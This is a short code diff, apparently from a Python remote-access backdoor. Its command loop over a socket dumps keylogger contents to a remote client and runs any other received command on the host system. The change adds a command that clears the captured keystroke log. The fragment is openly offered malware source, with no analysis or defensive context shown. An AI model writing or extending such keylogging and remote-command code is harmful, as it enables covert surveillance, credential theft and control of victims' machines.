@@ -61,6 +61,9 @@ def run(host, port):
             elif command == "keylog dump":
                 data = klogger.get_log()
                 socket_send(client_socket, data)
+            elif command == "keylog clear":
+                klogger.clear_log()
+                socket_send(client_socket, "[+] Log Cleared.")
             else:  # * Run Other System Commands
                 execute_system_command(client_socket, command)
     except:
